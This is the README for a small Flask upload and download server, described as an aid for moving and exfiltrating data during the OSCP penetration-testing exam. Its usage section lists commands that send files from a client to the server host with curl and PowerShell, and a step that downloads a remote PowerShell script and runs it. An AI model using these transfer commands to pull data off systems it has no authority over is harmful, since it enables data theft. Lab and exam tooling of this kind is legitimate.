# multi_server

**Warning : This app is designed to help during the OSCP to download/exfiltrate datas. Not to be run in production.**

Tested on : Python 3.9

A simple server in Flask to download/upload files.

## Server Setup

### Binaries

For example on Windows, you can download the latest version :

    PS > iwr -uri https://github.com/adann0/multi_server/releases/download/v0.0.1/multi_server.exe -outfile multi_server.exe
 
Then you can run the Server :

    PS > .\multi_server.exe <port>

After that you can access the webapp at `http://<ip>:<port>`.

### Python Module

	$ python3 -m venv venv
	$ source venv/bin/activate
	$ pip install git+https://github.com/adann0/multi_server.git

You can then run the Server :

	$ python3 -m multi_server <port>

After that you can access the webapp at `http://<ip>:<port>`.

## Client Usage

You can download the files in the current folder where the Server is running, for example on a Windows Client :

    PS > iwr -uri http://<ip>:<port>/<file> -outfile <file>

You can also upload your files, on a Linux Client :

    $ curl -X POST -F "file=@<file_path>" http://<ip>:<port>/upload

Or with Powershell :

    PS > iwr -uri https://raw.githubusercontent.com/adann0/multi_server/main/upload.ps1 -outfile upload.ps1
    PS > .\upload.ps1 -ip <ip> [-port <port>] -file <file_path> 

The uploaded files are in **uploads/** on the Server.

## Recompile Binaries

	$ pyinstaller --add-data multi_server/templates:templates --name multi_server --onefile --clean multi_server/__main__.py

## Source

- https://www.geeksforgeeks.org/how-to-upload-file-in-python-flask/
